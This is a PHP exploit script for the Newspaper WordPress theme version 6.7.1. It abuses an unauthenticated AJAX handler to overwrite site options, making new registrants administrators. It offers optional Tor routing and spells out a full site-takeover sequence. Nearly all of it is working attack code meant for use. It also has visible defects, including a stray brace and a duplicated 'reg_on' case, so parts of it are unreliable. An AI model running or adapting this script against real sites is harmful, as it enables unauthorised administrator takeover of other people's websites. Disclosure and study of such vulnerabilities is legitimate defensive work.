/**
 * Exploit Title: Newspaper WP Theme Expoit
 * Google Dork:
 * Exploit Author: wp0Day.com <contact@wp0day.com>
 * Vendor Homepage: http://tagdiv.com/newspaper/
 * Software Link: http://themeforest.net/item/newspaper/5489609
 * Version: 6.7.1
 * Tested on: Debian 8, PHP 5.6.17-3
 * Type: WP Options Overwrite, Possible more
 * Time line: Found [23-APR-2016], Vendor notified [23-APR-2016], Vendor fixed: [27-APR-2016], [RD:1]
 */
 
 
require_once(&#039;curl.php&#039;);
//OR
//include(&#039;https://raw.githubusercontent.com/svyatov/CurlWrapper/master/CurlWrapper.php&#039;);
$curl = new CurlWrapper();
 
 
$options = getopt("t:m:u:p:f:c:",array(&#039;tor:&#039;));
print_r($options);
$options = validateInput($options);
 
if (!$options){
    showHelp();
}
 
if ($options[&#039;tor&#039;] === true)
{
    echo " ### USING TOR ###\n";
    echo "Setting TOR Proxy...\n";
    $curl->addOption(CURLOPT_PROXY,"http://127.0.0.1:9150/");
    $curl->addOption(CURLOPT_PROXYTYPE,7);
    echo "Checking IPv4 Address\n";
    $curl->get(&#039;https://dynamicdns.park-your-domain.com/getip&#039;);
    echo "Got IP : ".$curl->getResponse()."\n";
    echo "Are you sure you want to do this?\nType &#039;wololo&#039; to continue: ";
    $answer = fgets(fopen ("php://stdin","r"));
    if(trim($answer) != &#039;wololo&#039;){
        die("Aborting!\n");
    }
    echo "OK...\n";
}
 
function exploit(){
    global $curl, $options;
    switch ($options[&#039;m&#039;]){
        case "admin_on":
              echo "Setting default role to Administrator \n";
              $data = array(&#039;action&#039;=>&#039;td_ajax_update_panel&#039;, &#039;wp_option[default_role]&#039;=>&#039;administrator&#039;);
        break;
        case "admin_off":
              echo "Setting default role to Subscriber \n";
              $data = array(&#039;action&#039;=>&#039;td_ajax_update_panel&#039;, &#039;wp_option[default_role]&#039;=>&#039;subscriber&#039;);
        break;
        case "reg_on":
            echo "Enabling registrations\n";
            $data = array(&#039;action&#039;=>&#039;td_ajax_update_panel&#039;, &#039;wp_option[users_can_register]&#039;=>&#039;1&#039;);
        break;
        case "reg_on":
            echo "Disabling registrations\n";
            $data = array(&#039;action&#039;=>&#039;td_ajax_update_panel&#039;, &#039;wp_option[users_can_register]&#039;=>&#039;0&#039;);
        break;
 
    }
 
    $curl->post($options[&#039;t&#039;].&#039;/wp-admin/admin-ajax.php&#039;, $data);
    $resp = $curl->getResponse();
    echo "Response: ". $resp."\n";
}
 
 
exploit();
 
 
 
function validateInput($options){
 
    if ( !isset($options[&#039;t&#039;]) || !filter_var($options[&#039;t&#039;], FILTER_VALIDATE_URL) ){
        return false;
    }
 
        $options[&#039;t&#039;] = $options[&#039;t&#039;].&#039;/&#039;;
    }
    if (!isset($options[&#039;m&#039;]) || !in_array($options[&#039;m&#039;], array(&#039;admin_on&#039;,&#039;reg_on&#039;,&#039;admin_off&#039;,&#039;reg_off&#039;) ) ){
        return false;
    }
 
    $options[&#039;tor&#039;] = isset($options[&#039;tor&#039;]);
 
    return $options;
}
 
 
function showHelp(){
    global $argv;
    $help = <<<EOD
 
    Newspaper WP Theme Exploit
 
Usage: php $argv[0] -t [TARGET URL] --tor [USE TOR?] -m [MODE]
 
       [MODE] admin_on - Default admin level on reg. admin_off - Default subscriber on reg.
              reg_on - Turns on user registration. reg_off - Turns off user registrations.
 
       Trun on registrations, set default level to admin, register a user on the webiste,
       turn off admin mode, turn off user registrations.
 
Examples:
       [Register a new user as Admin]
 
    Misc:
           CURL Wrapper by Leonid Svyatov <leonid@svyatov.ru>
           @link http://github.com/svyatov/CurlWrapper
           @license http://www.opensource.org/licenses/mit-license.html MIT License
 
EOD;
    echo $help."\n\n";
    die();
}

